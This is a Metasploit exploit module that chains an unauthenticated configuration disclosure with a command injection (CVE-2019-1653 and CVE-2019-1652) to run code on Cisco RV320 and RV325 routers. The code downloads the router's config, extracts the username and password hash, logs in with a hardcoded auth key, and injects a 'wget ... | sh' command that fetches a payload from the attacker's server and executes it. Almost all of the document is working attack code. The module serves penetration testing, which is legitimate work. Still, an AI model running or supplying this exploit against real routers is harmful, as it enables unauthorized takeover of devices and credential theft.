# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking


  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Cisco RV320 and RV325 Unauthenticated Remote Code Execution",
      &#039;Description&#039;    => %q{
        This exploit module combines an information disclosure (CVE-2019-1653)
        and a command injection vulnerability (CVE-2019-1652) together to gain
        unauthenticated remote code execution on Cisco RV320 and RV325 small business
        routers. Can be exploited via the WAN interface of the router. Either via HTTPS
        on port 443 or HTTP on port 8007 on some older firmware versions.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
        &#039;RedTeam Pentesting GmbH&#039;, # Discovery, Metasploit
        &#039;Philip Huppert&#039;,          # Discovery
        &#039;Benjamin Grap&#039;            # Metasploit
      ],
      &#039;References&#039;     => [
          [ &#039;CVE&#039;,&#039;2019-1653&#039; ],
          [ &#039;CVE&#039;,&#039;2019-1652&#039; ],
          [ &#039;EDB&#039;,&#039;46243&#039; ],
          [ &#039;BID&#039;,&#039;106728&#039; ],
          [ &#039;BID&#039;,&#039;106732&#039; ],
          [ &#039;URL&#039;, &#039;https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export&#039; ],
          [ &#039;URL&#039;, &#039;https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection&#039; ]
      ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Targets&#039;        =>
        [
         [ &#039;LINUX MIPS64&#039;,
          {
           &#039;Platform&#039; => &#039;linux&#039;,
           &#039;Arch&#039;     => ARCH_MIPS64
          }
         ]
        ],
      &#039;Payload&#039;        =>
        {
         &#039;BadChars&#039; => ""
        },
      &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039; ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Sep 9 2018",
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      Opt::RPORT(8007), # port of Cisco webinterface
      OptString.new(&#039;URIPATH&#039;, [true, &#039;The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)&#039;, &#039;/&#039;]),
      OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the payload request&#039;, 15]),
    ])
    deregister_options(&#039;SSLCert&#039;) # not required since stager only uses HTTP.
  end

  def execute_command(cmd, opts = {})
    # use generated payload, we don&#039;t have to do anything here
  end

  def autofilter
    true
  end

  def on_request_uri(cli, req)
    print_status("#{peer} - Payload request received: #{req.uri}")
    @cmdstager = generate_cmdstager().join(&#039;;&#039;)
    send_response(cli, "#{@cmdstager}")
  end

  def primer
    payload_url = get_uri
    print_status("Downloading configuration from #{peer}")
    if(datastore[&#039;USE_SSL&#039;])
      print_status("Using SSL connection to router.")
    end
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri("cgi-bin","config.exp"),
      &#039;SSL&#039; => datastore[&#039;USE_SSL&#039;]
    })
    unless res
      vprint_error(&#039;Connection failed.&#039;)
      return nil
    end

    unless res.code == 200
      vprint_error(&#039;Could not download config. Aborting.&#039;)
      return nil
    end

    print_status("Successfully downloaded config")
    username = res.body.match(/^USERNAME=([a-zA-Z]+)/)[1]
    pass = res.body.match(/^PASSWD=(\h+)/)[1]
    authkey = "1964300002"
    print_status("Got MD5-Hash: #{pass}")
    print_status("Loging in as user #{username} using password hash.")
    print_status("Using default auth_key #{authkey}")
    res2 = send_request_cgi({
      &#039;uri&#039; => normalize_uri("cgi-bin","userLogin.cgi"),
      &#039;SSL&#039; => datastore[&#039;USE_SSL&#039;],
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => "login=true&portalname=CommonPortal&password_expired=0&auth_key=#{authkey}&auth_server_pw=Y2lzY28%3D&submitStatus=0&pdStrength=1&username=#{username}&password=#{pass}&LanguageList=Deutsch&current_password=&new_password=&re_new_password="
    })

    unless res
      vprint_error(&#039;Connection failed during login. Aborting.&#039;)
      return nil
    end

    unless res.code == 200
      vprint_error(&#039;Login failed with downloaded credentials. Aborting.&#039;)
      return nil
    end

    #Extract authentication cookies
    cookies = res2.get_cookies()
    print_status("Successfully logged in as user #{username}.")
    print_status("Got cookies: #{cookies}")
    print_status("Sending payload. Staging via #{payload_url}.")
    #Build staging command
    command_string = CGI::escape("&#039;$(wget -q -O- #{payload_url}|sh)&#039;")
    if(command_string.length <= 63)
      print_status("Staging command length looks good. Sending exploit!")
    else
      vprint_error("Warning: Staging command length probably too long. Trying anyway...")
    end

    res3 = send_request_cgi({
      &#039;uri&#039; => normalize_uri("certificate_handle2.htm"),
      &#039;SSL&#039; => datastore[&#039;USE_SSL&#039;],
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
        &#039;vars_get&#039; => {
         &#039;type&#039; => &#039;4&#039;,
        },
        &#039;vars_post&#039; => {
          &#039;page&#039; => &#039;self_generator.htm&#039;,
                    &#039;totalRules&#039; => &#039;1&#039;,
                    &#039;OpenVPNRules&#039; => &#039;30&#039;,
                    &#039;submitStatus&#039; => &#039;1&#039;,
                    &#039;log_ch&#039; => &#039;1&#039;,
                    &#039;type&#039; => &#039;4&#039;,
                    &#039;Country&#039; => &#039;A&#039;,
                    &#039;state&#039; => &#039;A&#039;,
                    &#039;locality&#039; => &#039;A&#039;,
                    &#039;organization&#039; => &#039;A&#039;,
                    &#039;organization_unit&#039; => &#039;A&#039;,
                    &#039;email&#039; => &#039;any@example.com&#039;,
                    &#039;KeySize&#039; => &#039;512&#039;,
                    &#039;KeyLength&#039; => &#039;1024&#039;,
                    &#039;valid_days&#039; => &#039;30&#039;,
                    &#039;SelectSubject_c&#039; => &#039;1&#039;,
                    &#039;SelectSubject_s&#039; => &#039;1&#039;
        },
        &#039;data&#039; => "common_name=#{command_string}"
    })
    unless res3
      vprint_error(&#039;Connection failed while sending command. Aborting.&#039;)
      return nil
    end

    unless res3.code == 200
      vprint_error(&#039;Sending command not successful.&#039;)
      return nil
    end
    print_status("Sending payload timed out. Waiting for stager to connect...")
  end

  def check
    #Check if device is vulnerable by downloading the config
    res = send_request_cgi({&#039;uri&#039;=>normalize_uri("cgi-bin","config.exp")})

    unless res
      vprint_error(&#039;Connection failed.&#039;)
      return CheckCode::Unknown
    end

    unless res.code == 200
      return CheckCode::Safe
    end

    unless res.body =~ /PASSWD/
      return CheckCode::Detected
    end

    CheckCode::Vulnerable
  end

  def exploit
    # Main function.
    # Setting delay for the Stager.
    Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) {super}
  rescue Timeout::Error
    print_status("Waiting for stager connection timed out. Try increasing the delay.")
  end
end

